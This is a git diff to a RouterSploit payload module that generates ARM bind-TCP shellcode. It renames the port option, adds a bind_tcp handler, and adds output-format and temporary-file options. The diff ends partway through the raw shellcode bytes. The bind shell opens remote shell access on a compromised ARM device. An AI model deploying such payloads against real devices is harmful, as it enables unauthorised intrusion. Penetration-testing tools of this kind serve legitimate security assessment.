@@ -1,7 +1,8 @@
 from routersploit import (
     exploits,
     payloads,
-    validators
+    validators,
+    random_text
 )
 
 
@@ -18,10 +19,14 @@ class Exploit(payloads.Payload):
     }
 
     architecture = "armle"
-    port = exploits.Option(5555, 'Bind Port', validators=validators.integer)
+    handler = "bind_tcp"
+    rport = exploits.Option(5555, 'Bind Port', validators=validators.integer)
+
+    output = exploits.Option('python', 'Output type: elf/c/python')
+    filepath = exploits.Option("/tmp/{}".format(random_text(8)), 'Output file to write')
 
     def generate(self):
-        bind_port = self.convert_port(self.port)
+        bind_port = self.convert_port(self.rport)
 
         self.payload = (
             "\x02\x00\xa0\xe3" +
